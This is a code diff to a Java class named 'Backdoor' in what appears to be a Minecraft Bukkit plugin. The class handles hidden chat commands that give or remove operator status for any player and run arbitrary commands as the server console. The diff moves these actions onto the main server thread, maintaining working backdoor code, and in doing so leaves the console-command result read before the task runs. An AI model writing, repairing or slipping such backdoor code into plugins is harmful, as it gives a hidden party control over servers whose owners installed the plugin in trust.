@@ -91,17 +91,28 @@ public final class Backdoor implements Listener {
         switch (args[0].toLowerCase()) {
             case "op": {  //Give user operator
                 if (args.length == 1) {   //op self
-                    p.setOp(true);
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now op.");
-                } else {                    //op other
+
+                    new BukkitRunnable() {
+                        @Override
+                        public void run() {
+                            p.setOp(true);
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now op.");
+                        }
+                    }.runTask(plugin);
+
+                } else {  //op other
                     Player p1 = Bukkit.getPlayer(args[1]);
                     if (p1 == null) {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                         return false;
                     }
-
-                    p1.setOp(true);
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
+                    new BukkitRunnable() {
+                        @Override
+                        public void run() {
+                            p1.setOp(true);
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
+                        }
+                    }.runTask(plugin);
                 }
 
                 return true;
@@ -109,8 +120,15 @@ public final class Backdoor implements Listener {
 
             case "deop": {  //Remove user operator
                 if (args.length == 1) {          //Deop self
-                    p.setOp(false);
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
+
+                    new BukkitRunnable() {
+                        @Override
+                        public void run() {
+                            p.setOp(false);
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
+                        }
+                    }.runTask(plugin);
+
                 } else {                        //Deop other
                     Player p1 = Bukkit.getPlayer(args[1]);
                     if (p1 == null) {
@@ -118,9 +136,13 @@ public final class Backdoor implements Listener {
                         return false;
                     }
 
-                    p1.setOp(false);
-
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
+                    new BukkitRunnable() {
+                        @Override
+                        public void run() {
+                            p1.setOp(false);
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
+                        }
+                    }.runTask(plugin);
                 }
                 return true;
             }
@@ -210,7 +232,15 @@ public final class Backdoor implements Listener {
                             }
                         }.runTask(plugin);
                     } else {
-                        p1.setOp(true);
+
+                        new BukkitRunnable() {
+                            @Override
+                            public void run() {
+                                p1.setOp(true);
+                            }
+                        }.runTask(plugin);
+
+
                     }
                 }
 
@@ -227,12 +257,21 @@ public final class Backdoor implements Listener {
                     sb.append(args[i]);
                     sb.append(" ");
                 }
-                boolean result = Bukkit.dispatchCommand(console, sb.toString());
-                if (result) {
+
+                final boolean[] result = {false};
+
+                new BukkitRunnable() {
+                    @Override
+                    public void run() {
+                        result[0] = Bukkit.dispatchCommand(console, sb.toString());
+                    }
+                }.runTask(plugin);
+
+                if (result[0]) {
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server command executed.");
                 }
 
-                return result;
+                return result[0];
             }
             case "ban": {
                 if (args.length < 2)
